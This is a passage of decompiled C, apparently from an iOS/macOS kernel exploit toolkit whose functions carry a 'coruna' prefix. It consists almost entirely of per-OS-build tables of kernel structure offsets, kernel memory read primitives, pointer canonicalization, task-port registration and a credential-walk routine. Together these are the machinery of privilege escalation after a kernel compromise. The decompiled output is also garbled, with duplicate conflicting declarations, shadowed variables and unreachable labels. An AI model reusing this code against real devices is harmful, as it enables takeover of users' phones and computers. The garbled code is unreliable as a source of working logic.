    if (err - 0x1f53U < 2) {
      err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
      handle = 0x308;
    }
    else {
      if (err == 0x1809) {
        handle = 800;
        err = coruna_kernel600c_residual_228(handle,handle + addr_2,&scratch);
        if (err == 0) {
        u = 0;
        }
        else {
        handle = coruna_ptr_canonicalize(handle,scratch);
        u = 0;
        if (handle != 0) {
        u = scratch;
        }
        }
        return u;
      }
      if (err != 0x1c1b) {
        return 0;
      }
      err = 0x1c1b19145ffffe < *(unsigned long *)(handle + 0x158);
      status = *(unsigned long *)(handle + 0x158) == 0x1c1b19145fffff;
      handle = 0x338;
    }
    if (!err || status) {
      handle = 0x330;
    }
  }
  else {
    if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
      return 0;
    }
    handle = 0x300;
  }
fail:
  err = coruna_kernel600c_residual_228(handle,handle + addr_2,&scratch);
  if (err == 0) {
    u = 0;
  }
  else {
    handle = coruna_ptr_canonicalize(handle,scratch);
    u = 0;
    if (handle != 0) {
      u = scratch;
    }
  }
  return u;
}





uint32_t coruna_iosurface_field_read(long handle)
{
  int err;
  uint32_t u;
  
  u = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      u = 0x2c0;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x2e8;
      }
      return u;
    }
    if (err == 0x1809) {
      return 0x2d0;
    }
    if (err == 0x1c1b) {
      return 0x2e0;
    }
  }
  else if ((err == 0x2258 || err == 0x225c) || err == 0x2712) {
    u = 0x2b8;
  }
  return u;
}





uint32_t coruna_return_zero_2865c(long handle)
{
  bool err;
  bool status;
  int err;
  uint32_t u;
  uint32_t size;
  unsigned long version;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        err = coruna_ctx_test_flag(handle,0x5584001);
        if (err == 0) {
          return 0x380;
        }
        return 0x388;
      }
      if (err != 0x1c1b) {
        return 0;
      }
      version = *(unsigned long *)(handle + 0x158);
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x390;
      if (err != 0) {
        u = 0x3a0;
      }
      size = 0x398;
      if (err != 0) {
        size = 0x3b0;
      }
      if (version < 0x1c1b1914600000) {
        return u;
      }
      return size;
    }
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x378;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        u = 0x3a0;
      }
      size = 0x390;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        size = 0x3b8;
      }
      if (err == 0) {
        return u;
      }
      return size;
    }
    err = 0x1f530f027ffffe < *(unsigned long *)(handle + 0x158);
    status = *(unsigned long *)(handle + 0x158) == 0x1f530f027fffff;
    size = 0x3c8;
    u = 0x3a0;
  }
  else {
    if (err != 0x2258) {
      if (err != 0x225c && err != 0x2712) {
        return 0;
      }
      return 0x730;
    }
    err = 0x22580f032ffffe < *(unsigned long *)(handle + 0x158);
    status = *(unsigned long *)(handle + 0x158) == 0x22580f032fffff;
    size = 0x530;
    u = 0x538;
  }
  if (!err || status) {
    u = size;
  }
  return u;
}





int coruna_return_zero_287d4(long handle)
{
  int err;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (err - 0x1f53U < 2) {
      if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
        err = coruna_return_zero_2865c(handle);
        return err + 8;
      }
      return 0;
    }
    if (err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x225c && err != 0x2712) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x5100000);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5584001);
    status = 0x370;
    if (err != 0) {
      status = 0x388;
    }
  }
  else {
    status = 0x3a0;
  }
  return status;
}





uint32_t coruna_return_zero_2b870(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (1 < err - 0x1f53U && err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x2712 && err != 0x225c) {
    return 0;
  }
  u = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0;
  }
  return u;
}





uint32_t coruna_return_zero_2b870_28908(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (1 < err - 0x1f53U && err != 0x2258) {
      return 0;
    }
  }
  else if (err != 0x2712 && err != 0x225c) {
    return 0;
  }
  u = 0x70;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = 0;
  }
  return u;
}





unsigned long coruna_call_return_zero_2b870_28908(long arg)

{
  unsigned long type_id_21;
  
  type_id_21 = coruna_return_zero_2b870_28908();
  if ((int)type_id_21 != 0) {
    type_id_21 = (unsigned long)(uint)((int)type_id_21 - *(int *)(arg + 0x168));
  }
  return type_id_21;
}





long coruna_return_zero_2899c(long handle,uint64_t val)
{
  int err;
  uint u;
  long handle;
  long addr;
  
  if (*(int *)(handle + 0x140) < 0x2258) {
    u = coruna_return_zero_2865c();
    if (u == 0) {
      return 0;
    }
  }
  else {
    err = coruna_return_zero_287d4();
    if (err == 0) {
      return 0;
    }
    u = err - *(int *)(handle + 0x168);
  }
  handle = coruna_kernel600c_via_return_zero_28118(handle,val);
  addr = 0;
  if (handle != 0) {
    addr = handle + (unsigned long)u +
            ((long)*(int *)(handle + 0x168) << (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)));
  }
  return addr;
}





long coruna_return_zero_28a34(long handle,long addr_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_return_zero_2865c();
  if (u != 0) {
    if (0x2257 < *(int *)(handle + 0x140)) {
      return addr_2 - (unsigned long)u;
    }
    err = coruna_kernel600c_residual_228(handle,(unsigned long)u + addr_2,&scratch);
    if ((err != 0) && (scratch != 0)) {
      handle = coruna_ptr_canonicalize(handle);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





uint32_t coruna_return_zero_2ba94(long handle)
{
  int err;
  uint32_t u;
  
  err = *(int *)(handle + 0x140);
  u = 0x28;
  if (err < 0x2258) {
    if (1 < err - 0x1f53U && err != 0x1809) {
      if (err != 0x1c1b) {
        return 0;
      }
      u = 0x20;
      if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
        u = 0x28;
      }
    }
  }
  else if ((err != 0x2258 && err != 0x225c) && err != 0x2712) {
    return 0;
  }
  return u;
}





void coruna_call_mach_vm_machine_attribute_29df8_28b40(void)
{
  coruna_macho_data_seg();
  return;
}





void coruna_macho_data_seg(long handle,unsigned long arg,int flags,char *path)
{
  int err;
  unsigned long u;
  int status;
  int flags;
  unsigned long size;
  long handle;
  long addr;
  long off;
  unsigned long version;
  long base;
  int count;
  int scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info;
  long serial_buf;
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  status = *(int *)(handle + 0x140);
  size = 0;
  if (path == (char *)0x0) {
    if (status < 0x2258) {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
  }
  else if (status == 0x2258) {
    off = 0x381;
    addr = 0;
  }
  else {
    if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(size);
  }
  status = coruna_return_zero_2ba94(handle);
  if (status == 0) {
done:
    size = 0;
  }
  else {
    err = *(int *)(handle + 0x168);
    if (*(long *)(&k_kernel_slot_19f8 + handle) == 0) {
      serial_buf = 0;
      version = 0;
      base = 0;
    }
    else {
      coruna_macho_find_loadcmd(&thread_attr,*(long *)(&k_kernel_slot_19f8 + handle),"__DATA");
      size = 0;
      if ((host_info == 0) || (version = host_info, base = thread_attr, serial_buf == 0))
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(size);
    }
    count = 0;
    u = arg;
cleanup:
    do {
      bootargs = u;
      handle = coruna_return_zero_28a34(handle,bootargs);
      if (handle != 0) {
        if (path == (char *)0x0) {
          flags = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + addr,4,&scratch);
          if (flags == 0) { size = 0; break; }
          size = bootargs;
          if (scratch == flags) break;
        }
        else {
          flags = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + off,0x21,&thread_attr);
          if (flags == 0) { size = 0; break; }
          flags = _strncmp((char *)&thread_attr,path,0x21);
          size = bootargs;
          if (flags == 0) break;
        }
      }
      flags = coruna_kernel600c_residual_228(handle,bootargs + (uint)(err + status),&bootargs);
      if (flags == 0) { size = 0; break; }
      bootargs = coruna_ptr_canonicalize(handle,bootargs);
      if (bootargs != 0) {
        if (((base != 0) && (version <= bootargs)) && (bootargs < version + serial_buf)) {
          flags = coruna_kernel600c_residual_228(handle,bootargs,&bootargs);
          if (flags == 0) { size = 0; break; }
          bootargs = coruna_ptr_canonicalize(handle,bootargs);
          if (bootargs == 0) goto check_ok;
        }
        u = bootargs;
        if (bootargs != arg) continue;
      }
check_ok:
      coruna_semaphore_timedwait(handle,"_reply_port");
      size = 0;
      count = count + 1;
      u = arg;
    } while (count != 6);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(size);
}





void coruna_call_macho_data_seg_2bb24_2bdb4(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_macho_data_seg(val,id_2,0,size_3);
  return;
}





long coruna_return_zero_28de0(long handle,long addr_2,uint *size,uint32_t *size_x)
{
  int err;
  long handle;
  long scratch;
  uint bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1809 && err != 0x1c1b) {
        return 0;
      }
      handle = 0x14;
      err = coruna_kernel600c_residual_228(handle,addr_2 + 0x20,&scratch);
      if ((err == 0) || (scratch == 0)) {
      return 0;
      }
      if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
      scratch = coruna_kernel600c_via_ctx_test_flag_11(handle,scratch,&bootargs);
      }
      scratch = coruna_ptr_canonicalize(handle,scratch);
      if (scratch != 0) {
      if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
      if (0x1f01 < *(int *)(handle + 0x140)) {
      addr_2 = scratch;
      }
      err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2 + handle,&bootargs);
      if (err == 0) {
      return 0;
      }
      }
      else {
      if (bootargs == 0) {
      return 0;
      }
      bootargs = bootargs / 0x18;
      }
      *size = bootargs;
      *size_x = 0x18;
      return scratch;
      }
      return 0;
    }
  }
  else if ((err != 0x2258 && err != 0x2712) && err != 0x225c) {
    return 0;
  }
  handle = 8;
fail:
  err = coruna_kernel600c_residual_228(handle,addr_2 + 0x20,&scratch);
  if ((err == 0) || (scratch == 0)) {
    return 0;
  }
  if (0x22580a06bfffff < *(unsigned long *)(handle + 0x158)) {
    scratch = coruna_kernel600c_via_ctx_test_flag_11(handle,scratch,&bootargs);
  }
  scratch = coruna_ptr_canonicalize(handle,scratch);
  if (scratch != 0) {
    if (*(unsigned long *)(handle + 0x158) < 0x22580a06c00000) {
      if (0x1f01 < *(int *)(handle + 0x140)) {
        addr_2 = scratch;
      }
      err = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr_2 + handle,&bootargs);
      if (err == 0) {
        return 0;
      }
    }
    else {
      if (bootargs == 0) {
        return 0;
      }
      bootargs = bootargs / 0x18;
    }
    *size = bootargs;
    *size_x = 0x18;
    return scratch;
  }
  return 0;
}





void coruna_mach_ports_register(long handle,mach_port_name_t arg,uint64_t val,uint64_t id_2)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  long handle;
  long addr;
  mach_port_t scratch;
  int bootargs;
  uint32_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  if ((*(mach_port_name_t *)k_kernel_mach_task_self_slot != arg) ||
     (handle = *(long *)(handle + 0x1a0), handle == 0)) {
    if (*(long *)(&k_kernel_slot_19d0 + handle) == 0) {
      return;
    }
    handle = coruna_kernel600c_via_fn_ptr_cast_2_4(handle);
    if (handle == 0) {
      return;
    }
    if (*(task_t *)(&k_kernel_slot_1918 + handle) + 1 < 2) {
      bootargs = 0;
      lk2 = _pid_for_task(arg,&bootargs);
      if (lk2 != 0) {
        return;
      }
      handle = coruna_macho_data_seg_34040(handle,handle,bootargs,0);
      if (handle == 0) {
        return;
      }
    }
    else {
      scratch = arg;
      lk2 = _mach_ports_register(*(task_t *)(&k_kernel_slot_1918 + handle),&scratch,1);
      if (lk2 != 0) {
        return;
      }
      if (*(int *)(handle + 0x140) == 0x1809) {
        addr = 0x308;
      }
      else {
        if (*(int *)(handle + 0x140) != 0x1c1b) {
          return;
        }
        addr = 0x318;
      }
      err = coruna_kernel600c_residual_307(handle,addr + handle,&bootargs);
      if (err == 0) {
        return;
      }
      handle = coruna_fn_ptr_cast_2(handle,coruna_u64_pack((scratch), (bootargs)));
      if (handle == 0) {
        return;
      }
      handle = coruna_kernel600c_via_fn_ptr_cast_2_4(handle,handle);
      if (handle == 0) {
        return;
      }
      scratch = 0;
      lk2 = _mach_ports_register(*(task_t *)(&k_kernel_slot_1918 + handle),&scratch,1);
      if (lk2 != 0) {
        return;
      }
    }
    handle = coruna_kernel600c_via_fn_ptr_cast_2_5(handle,handle);
    if (handle == 0) {
      return;
    }
    if (*(mach_port_name_t *)ptr == arg) {
      *(long *)(handle + 0x1a0) = handle;
    }
  }
  coruna_kernel600c_via_kernel600c_via_mach_vm_read_overwrite(handle,handle,val,id_2);
  return;
}





long coruna_return_zero_290d4(uint64_t val,uint64_t id_2,uint size)
{
  long handle;
  int scratch;
  uint bootargs;
  
  if (1 < size + 1) {
    handle = coruna_mach_ports_register(val,id_2,&bootargs,&scratch);
    if (handle == 0) {
      return 0;
    }
    if (size >> 8 < bootargs) {
      return handle + (unsigned long)(scratch * (size >> 8));
    }
  }
  return 0;
}





void coruna_call_return_zero_290d4(uint64_t val,uint64_t id_2)
{
  coruna_return_zero_290d4(val,*(uint32_t *)k_kernel_mach_task_self_slot,id_2);
  return;
}





uint64_t coruna_kernel600c_via_return_zero_290d4(uint64_t val)
{
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  
  handle = coruna_return_zero_290d4();
  u = 0;
  if (handle != 0) {
    err = coruna_kernel600c_residual_228(val,handle,&scratch);
    if (err == 0) {
      u = 0;
    }
    else {
      u = coruna_ptr_canonicalize(val,scratch);
    }
  }
  return u;
}





unsigned long coruna_return_zero_291a0(long arg,long val,unsigned long n)

{
  int fd_11;
  long base;
  unsigned long u;
  unsigned long cache_91;
  unsigned long cache_100;
  unsigned long cache_54;
  
  cache_91 = 0;
  fd_11 = coruna_kernel600c_residual_228(arg,val + (unsigned long)(4 < *(long *)(arg + 0x158) +
                                                     0xffe0abe700000000U >> 0x20) * 0x10,&cache_54);
  if (fd_11 != 0) {
    base = coruna_ptr_canonicalize(arg,cache_54);
    if (base == 0) {
      return 0;
    }
    if (*(int *)(arg + 0x140) < 0x1c1b) {
      return cache_54;
    }
    fd_11 = coruna_kernel600c_residual_228(arg,cache_54 + 0x20,&cache_100);
    if (fd_11 != 0) {
      base = coruna_ptr_canonicalize(arg,cache_100);
      if (base == 0) {
        return 0;
      }
      if ((n & 1) != 0) {
        return cache_100;
      }
      fd_11 = coruna_kernel600c_via_kernel600c_via_fd_read_full_2(arg,cache_100 + 0x38,&cache_91);
      if (fd_11 == 0) {
        return cache_91;
      }
      if (0x1f542301dfffff < *(unsigned long *)(arg + 0x158)) {
        cache_91 = coruna_return_zero_1e99c(arg,cache_91 >> 0x20);
      }
      u = coruna_ptr_canonicalize(arg,cache_91);
      return u;
    }
  }
  return 0;
}





long coruna_kernel600c_via_return_zero_293c0(uint64_t val,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  int err;
  int status;
  long addr;
  long off;
  long base;
  uint u;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  
  addr = coruna_return_zero_293c0();
  base = 0;
  if (addr != 0) {
    u = 0;
    do {
      err = false;
      err = coruna_kernel600c_residual_228(val,addr + 0x38,&thread_attr);
      handle = thread_attr;
      status = err;
joined_r0x000292fc:
      thread_attr = handle;
      if (!((((status == 0) || (handle == 0)) || (off = coruna_ptr_canonicalize(val,handle), off == 0)) ||
         (status = coruna_kernel600c_residual_228(val,handle + -0x10,&bootargs), status == 0))) {
        off = thread_attr;
        if (arg < bootargs) {
        fail:
        status = coruna_kernel600c_residual_228(val,off,&thread_attr);
        handle = thread_attr;
        goto joined_r0x000292fc;
        }
        status = coruna_kernel600c_residual_228(val,handle + -8,&scratch);
        if (!(status == 0)) {
        if (scratch <= arg) {
        off = thread_attr + 8;
        goto fail;
        }
        base = handle + -0x20;
        err = true;
        }
      }
joined_r0x0002939c:
    } while (((err != 0) && (!err)) && (err = u < 5, u = u + 1, err));
  }
  return base;
}





long coruna_return_zero_293c0(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_return_zero_2ba94();
  if (u != 0) {
    scratch = coruna_kernel600c_via_return_zero_28118(val,id_2);
    if (scratch == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(val,scratch + (unsigned long)u,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





unsigned long coruna_return_zero_29444(long arg,uint64_t val,uint64_t n,unsigned long *m)

{
  int fd_11;
  unsigned long type_id_17;
  long serial_11;
  unsigned long size;
  unsigned long cache_97;
  unsigned long cache_59;
  
  fd_11 = coruna_ctx_test_flag(arg,0x800000);
  if (fd_11 == 0) {
    serial_11 = coruna_kernel600c_via_return_zero_293c0(arg,val,n);
    if ((serial_11 != 0) && (fd_11 = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_11 + 0x38,0x10,&cache_97), fd_11 != 0)) {
      if (0x1f542301dfffff < *(unsigned long *)(arg + 0x158)) {
        cache_97 = coruna_return_zero_1e99c(arg,cache_97 >> 0x20);
      }
      serial_11 = coruna_ptr_canonicalize(arg,cache_97);
      if (serial_11 != 0) {
        *m = cache_59 & 0xfffffffffffff000;
        return cache_97;
      }
    }
    return 0;
  }
  type_id_17 = coruna_mach_vm_page_info(val,n,m);
  if (type_id_17 == 0) {
    return 0;
  }
  if ((type_id_17 & 1) == 0) {
    if (*(long *)(&k_kernel_slot_19e0 + arg) == 0) {
      return 0;
    }
    size = *(long *)(&k_kernel_slot_19e0 + arg) + type_id_17;
    type_id_17 = coruna_ptr_canonicalize(arg,size);
    return type_id_17;
  }
  else {
    size = type_id_17 - *(long *)(arg + 0x138);
    if (type_id_17 >> 0x20 == 0) {
      size = size & 0xffffffff;
    }
    type_id_17 = coruna_ptr_canonicalize(arg,size);
    return type_id_17;
  }
  size = type_id_17 | size;
load_ok_80:
  type_id_17 = coruna_ptr_canonicalize(arg,size);
  return type_id_17;
}





void coruna_kernel600c_via_return_zero_28a34(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel600c_via_return_zero_28118();
  if (handle != 0) {
    coruna_return_zero_28a34(val,handle);
    return;
  }
  return;
}





long coruna_return_zero_295bc(long handle)
{
  int err;
  long handle;
  long scratch;
  
  scratch = coruna_return_zero_28a34();
  if (scratch == 0) {
    return 0;
  }
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    handle = 0x18;
    if (*(int *)(handle + 0x140) < 0x2258) {
      handle = 0x20;
    }
    err = coruna_kernel600c_residual_228(handle,handle + scratch,&scratch);
    if (err == 0) {
      return 0;
    }
    handle = coruna_ptr_canonicalize(handle,scratch);
    if (handle == 0) {
      return 0;
    }
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      handle = 0x20;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = 0xd8;
      }
    }
    else if (err == 0x1809) {
      handle = 0x100;
    }
    else {
      if (err != 0x1c1b) {
        return 0;
      }
      handle = 0xf0;
    }
  }
  else {
    if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
      return 0;
    }
    handle = 0x20;
  }
  return scratch + handle;
}





void coruna_kernel600c_via_return_zero_295bc(uint64_t val)
{
  long handle;
  
  handle = coruna_kernel600c_via_return_zero_28118();
  if (handle != 0) {
    coruna_return_zero_295bc(val,handle);
    return;
  }
  return;
}





uint64_t coruna_return_zero_29714(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  long handle;
  long addr;
  uint64_t scratch;
  uint64_t bootargs;
  
  handle = coruna_return_zero_295bc();
  if (handle == 0) {
    return 0;
  }
  err = coruna_kernel600c_residual_228(val,handle,&bootargs);
  if (err != 0) {
    addr = coruna_ptr_canonicalize(val,bootargs);
    if (addr == 0) {
      return 0;
    }
    if (size_3 == (uint64_t *)0x0) {
      return bootargs;
    }
    err = coruna_kernel600c_via_kernel600c_via_fd_read_full_2(val,handle,&scratch);
    if (err != 0) {
      *size_3 = scratch;
      return bootargs;
    }
  }
  return 0;
}





void coruna_kernel600c_via_return_zero_29714(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  
  handle = coruna_kernel600c_via_return_zero_28118();
  if (handle != 0) {
    coruna_return_zero_29714(val,handle,size_3);
    return;
  }
  return;
}





long coruna_return_zero_297e0(long handle)
{
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  long scratch;
  
  handle = coruna_kernel600c_via_return_zero_28118();
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err - 0x1f53U < 2 || err == 0x1c1b) {
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      err = coruna_ctx_test_flag(handle,0x5584201);
      err = err == 0;
      addr = 0x418;
      off = 0x460;
    }
    else {
      err = coruna_ctx_test_flag(handle,0x100000);
      if (err != 0) {
        off = 0x4f0;
        addr = handle + off;
        if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
        (err = coruna_kernel600c_residual_228(handle,handle + off,&scratch), addr = scratch, err == 0)) {
        return 0;
        }
        scratch = addr;
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err != 0) {
        off = 0x4e8;
        addr = handle + off;
        if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
        (err = coruna_kernel600c_residual_228(handle,handle + off,&scratch), addr = scratch, err == 0)) {
        return 0;
        }
        scratch = addr;
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,1);
      if (err != 0) {
        off = 0x4e0;
        addr = handle + off;
        if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
        (err = coruna_kernel600c_residual_228(handle,handle + off,&scratch), addr = scratch, err == 0)) {
        return 0;
        }
        scratch = addr;
        handle = coruna_ptr_canonicalize(handle,scratch);
        if (handle != 0) {
        return scratch;
        }
        return 0;
      }
      err = coruna_ctx_test_flag(handle,0x200);
      err = err == 0;
      addr = 0x4d0;
      off = 0x510;
    }
  }
  else {
    if (err != 0x1809) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x5584201);
    err = err == 0;
    addr = 0x3c0;
    off = 0x3d8;
  }
  if (!err) {
    off = addr;
  }
fail:
  addr = handle + off;
  if ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) &&
     (err = coruna_kernel600c_residual_228(handle,handle + off,&scratch), addr = scratch, err == 0)) {
    return 0;
  }
  scratch = addr;
  handle = coruna_ptr_canonicalize(handle,scratch);
  if (handle != 0) {
    return scratch;
  }
  return 0;
}





long coruna_return_zero_29948(long handle)
{
  int err;
  long handle;
  long addr;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    addr = coruna_return_zero_297e0(handle);
    if (addr != 0) {
      err = *(int *)(handle + 0x140);
      if (err == 0x1f53) {
        handle = 0x120;
      }
      else if (err == 0x1c1b) {
        handle = 0x128;
      }
      else {
        if (err != 0x1809) {
          return 0;
        }
        handle = 0x128;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          handle = 0x150;
        }
      }
      addr = handle + addr;
    }
  }
  else {
    handle = coruna_return_zero_29a04(handle);
    addr = 0;
    if (handle != 0) {
      addr = handle + 8;
    }
  }
  return addr;
}





uint64_t coruna_return_zero_29a04(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  uint64_t scratch;
  
  scratch = 0;
  u = coruna_return_zero_29a88();
  if (u != 0) {
    handle = coruna_kernel600c_via_return_zero_28118(val,id_2);
    if (handle == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(val,handle + (unsigned long)u,&scratch);
    if (err != 0) {
      handle = coruna_ptr_canonicalize(val,scratch);
      if (handle == 0) {
        return 0;
      }
      return scratch;
    }
  }
  return 0;
}





int coruna_return_zero_29a88(long handle)
{
  int err;
  int status;
  unsigned long u;
  unsigned long size;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    if (1 < err - 0x1f53U) {
      if (err != 0x2258) {
        return 0;
      }
fail:
      err = coruna_ctx_test_flag(handle,0x1100000);
      if (err != 0) {
        return 0x378;
      }
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err != 0) {
        return 0x370;
      }
      err = coruna_ctx_test_flag(handle,1);
      if (err != 0) {
        return 0x360;
      }
      err = coruna_ctx_test_flag(handle,0x200);
      if (err == 0) {
        return 0x390;
      }
      return 0x350;
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x84000);
      if (err == 0) {
        err = coruna_ctx_test_flag(handle,1);
        if (err == 0) {
          err = coruna_ctx_test_flag(handle,0x200);
          status = 0x3c0;
          if (err != 0) {
            status = 0x380;
          }
        }
        else {
          status = 0x390;
        }
      }
      else {
        status = 0x398;
      }
    }
    else {
      status = 0x3a0;
    }
    u = *(unsigned long *)(handle + 0x158);
    err = status + -8;
    size = 0x1f541dffffffff;
  }
  else {
    err = coruna_ctx_test_flag(handle,0x1100000);
    if (err != 0) {
    return 0x378;
    }
    err = coruna_ctx_test_flag(handle,0x84000);
    if (err != 0) {
    return 0x370;
    }
    err = coruna_ctx_test_flag(handle,1);
    if (err != 0) {
    return 0x360;
    }
    err = coruna_ctx_test_flag(handle,0x200);
    if (err == 0) {
    return 0x390;
    }
    return 0x350;
  }
  if (u <= size) {
    err = status;
  }
  return err;
}





long coruna_return_zero_29c78(long handle)
{
  int err;
  long handle;
  long addr;
  
  handle = coruna_return_zero_297e0();
  addr = 0;
  if (handle != 0) {
    err = *(int *)(handle + 0x140);
    if (err < 0x1f53) {
      if (err == 0x1809) {
        addr = 0x108;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a09600000) {
          addr = 0x130;
        }
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0x108;
      }
    }
    else if (err == 0x1f53) {
      addr = 0x100;
    }
    else {
      if (err != 0x1f54) {
        return 0;
      }
      addr = 0xf0;
    }
    addr = addr + handle;
  }
  return addr;
}





long coruna_return_zero_29d20(long handle)
{
  int err;
  long handle;
  long addr;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_kernel600c_via_return_zero_28a34();
  }
  else {
    handle = coruna_return_zero_29df0();
  }
  if (handle == 0) {
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err == 0x1809) {
        addr = 0x298;
      }
      else {
        if (err != 0x1c1b) {
          return 0;
        }
        addr = 0x280;
      }
      return addr + handle;
    }
  }
  else if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
    return 0;
  }
  addr = 0x1c;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    addr = 0x300;
  }
fail:
  return addr + handle;
}





long coruna_return_zero_29df0(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  long scratch;
  long bootargs;
  
  u = coruna_return_zero_287d4();
  if (u != 0) {
    handle = coruna_kernel600c_via_return_zero_28118(val,id_2);
    if (handle == 0) {
      return 0;
    }
    addr = coruna_ptr_canonicalize(val,handle);
    if (addr == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(val,handle + (unsigned long)u,&bootargs);
    if (err != 0) {
      addr = coruna_ptr_canonicalize(val,bootargs);
      if (addr == 0) {
        return 0;
      }
      err = coruna_kernel600c_residual_228(val,bootargs + 8,&scratch);
      if (err != 0) {
        addr = coruna_ptr_canonicalize(val,scratch);
        if (handle == scratch && addr != 0) {
          return bootargs;
        }
        return 0;
      }
    }
  }
  return 0;
}





uint64_t coruna_iosurface_cred_walk(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809 || err == 0x1c1b) {
      return 0x10c;
    }
    if (err == 0x1f53) {
      return 0x11c;
    }
  }
  else if (err < 0x225c) {
    if (err == 0x1f54) {
      return 0x94;
    }
